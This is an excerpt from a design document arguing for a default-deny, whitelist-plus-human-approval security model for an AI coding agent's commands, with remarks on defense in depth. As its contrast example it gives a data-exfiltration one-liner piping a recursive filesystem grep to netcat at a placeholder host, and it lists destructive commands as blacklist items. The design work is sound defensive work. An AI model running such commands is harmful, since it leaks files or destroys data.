...
- **Deterministically rule-based, default-deny**: the core security model is **default-deny**, not default-allow. The system maintains a **whitelist** of explicitly approved actions (e.g. `ls` with specific arguments in a specific cwd; `cargo test` with bounded arguments; specific file paths for read/write access) and a **blacklist** of explicitly forbidden actions (e.g. `rm -rf /`, writes to `/etc`, network access to unknown hosts). Everything not on either list requires **human approval** before execution. **Approval is never by command name alone**: arguments, working directory, environment variables, child processes, filesystem access, and network access must all be constrained or evaluated. The whitelist matches the full execution context, not just the binary name — `grep` is safe, `grep -r / | nc evil.com 8080` is not. The system never needs to enumerate every dangerous thing — it only needs to know what's safe (small, enumerable) and what's dangerous (small, enumerable). The vast unknown middle goes to the human. This is the opposite of Codex/Claude Code's model, which is **default-allow with a blacklist**: the system must know every dangerous command to block it, and anything not on the blacklist is allowed. That model is inverted: it can never be complete, and new attacks bypass the blacklist by definition. Default-deny is the same model as firewall rules, Deno's permission system, and macOS Gatekeeper.
...
- Scattered sanitization at N trust boundaries is insufficient as the **sole** defense (one miss is a vulnerability). A central choke point is the direction. **However, defense in depth remains an open design requirement**: even with a central trust layer, independent guards at storage, rendering, and execution boundaries may be warranted. Central enforcement does not make boundary-specific sanitization unnecessary — it makes it a second layer rather than the only layer. This is an open question (see open question 1: is the render-path sandbox sufficient, or do we need defense in depth?).
